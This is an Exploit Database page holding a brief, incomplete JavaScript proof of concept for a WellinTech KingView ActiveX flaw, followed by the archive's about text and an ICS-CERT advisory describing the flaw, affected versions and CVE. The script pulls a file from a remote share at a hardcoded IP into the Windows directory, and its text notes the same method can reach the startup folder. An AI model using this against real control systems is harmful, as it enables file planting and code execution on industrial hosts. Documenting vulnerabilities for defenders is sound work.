<title>KingView Insecure ActiveX Control Proof of Concept - SuperGrid.ocx</title>
<p>This proof of concept will copy any arbritrary file from one location to a second location. A malicious user may be able to use this to copy a file from an attacker controlled share to the target or from the target to an attacker controlled system (ie from an attacker share to the startup folder). It can also be used to overwrite existing files.</p>

<input type=button onclick="copyfile()" value="Do It!">
<script>
function copyfile()
{
	var file1 = "\\\\192.168.1.165\\share\\poc.txt"; 			//source
	var file2 = "c:\\WINDOWS\\poc.txt"; 					//destination
	result = target.ReplaceDBFile(file1,file2);
}

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

ICS Advisory
# WellinTech KingView ActiveX Vulnerabilities

Last RevisedDecember 17, 2013
Alert CodeICSA-13-295-01

## OVERVIEW

This advisory is a follow-up to the alert titled ICS-ALERT-13-256-01 WellinTech KingView ActiveX VulnerabilitiesICS-ALERT-13-256-01 WellinTech KingView ActiveX Vulnerabilities, http://ics-cert.us-cert.gov/alerts/ICS-ALERT-13-256-01, Web site last accessed October 22, 2013. that was published September 13, 2013, on the NCCIC/ICS-CERT Web site.

Independent researcher “Blake” identified ActiveX vulnerabilities and released proof-of-concept (exploit) code for WellinTech KingView application without coordination with NCCIC/ICS‑CERT, the vendor, or any other coordinating entity known to NCCIC/ICS-CERT. WellinTech has produced a new version that mitigates these vulnerabilities.

These vulnerabilities could be exploited remotely. Exploits that target these vulnerabilities are known to be publicly available.

## AFFECTED PRODUCTS

The following KingView versions are affected:

* KingView versions older than Version 6.53.

## IMPACT

Successful exploitation of these vulnerabilities may allow an attacker to overwrite files and copy them from one location to another on the target machine.

Impact to individual organizations depends on many factors that are unique to each organization. NCCIC/ICS-CERT recommends that organizations evaluate the impact of these vulnerabilities based on their operational environment, architecture, and product implementation.

## BACKGROUND

WellinTech is a software development company specializing in automation and control. WellinTech is based in Beijing, China, with branches in the United States, Japan, Singapore, Europe, and Taiwan.

According to the WellinTech Web site, the KingView product is a Windows-based control, monitoring, and data collection application deployed across several industries including power, water, building automation, mining, and others.

## VULNERABILITY CHARACTERIZATION

### VULNERABILITY OVERVIEW

### INSECURE ACTIVEX CONTROLCWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share), http://cwe.mitre.org/data/definitions/40.html, Web site last accessed October 22, 2013.

WellinTech KingView contains a flaw in the SuperGrid.ocx ActiveX control that allows an attacker to traverse outside a restricted path. The issue is due to the program not properly sanitizing user input, specifically directory traversal style attacks.

This proof of concept will copy any arbitrary file from one location to a second location. It can also be used to overwrite existing files. This vulnerability may be used to inject files which, in turn, may allow arbitrary code execution.

CVE-2013-6127NVD, http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-6127, NIST uses this advisory to create the CVE Web site report. This Web site will be active sometime after publication of this advisory. has been assigned to this vulnerability. A CVSS v2 base score of 5.8 has been assigned; the CVSS vector string is (AV:N/AC:M/Au:N/C:N/I:P/A:P).CVSS Calculator, http://nvd.nist.gov/cvss.cfm?version=2&vector=AV:N/AC:M/Au:N/C:N/I:P/A:P, Web site last visited October 22, 2013.

### ACTIVEX REMOTE FILE CREATION/OVERWRITECWE-28: Path Traversal: '..\filedir', http://cwe.mitre.org/data/definitions/28.html, Web site last accessed October 22, 2013.

WellinTech KingView contains a flaw in the KChartXY.ocx ActiveX control that allows an attacker to traverse outside a restricted path. The issue is due to the program not properly sanitizing user input.

Proof of concept overwrites the win.ini file.
